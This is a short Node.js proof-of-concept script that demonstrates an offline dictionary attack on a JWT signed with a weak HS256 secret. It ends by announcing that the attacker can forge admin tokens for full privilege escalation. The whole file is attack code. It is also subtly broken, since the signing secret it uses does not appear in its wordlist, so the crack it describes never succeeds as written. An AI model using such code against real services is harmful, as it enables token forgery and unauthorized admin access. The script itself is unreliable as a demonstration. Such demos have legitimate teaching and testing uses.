const jwt = require("jsonwebtoken");

// A JWT captured from any login response (signed with the app's weak secret)
const captured = jwt.sign({ id: "123", role: "user" }, "supersecretjwtkey", { algorithm: "HS256" });
console.log("Captured token:\n" + captured + "\n");

// Attacker runs an offline dictionary attack (no server contact needed)
const wordlist = ["secret", "password", "jwtsecret", "mysecret",
  "supersecret", "supersecretkey", "214803c5228cb8b15f5a69456ef7546ea2f997125cbecd0b932a8a9cf7470bc4e991281dcca48a397eb74d6385500e9a", "changeme"];

console.log("Offline dictionary attack:");
for (const guess of wordlist) {
  try {
    jwt.verify(captured, guess);
    console.log("  [CRACKED] JWT_SECRET = '" + guess + "'");
    console.log("\nAttacker can now forge tokens with role:admin -> full privilege escalation.");
    break;
  } catch {
    console.log("  tried '" + guess + "' - no");
  }
}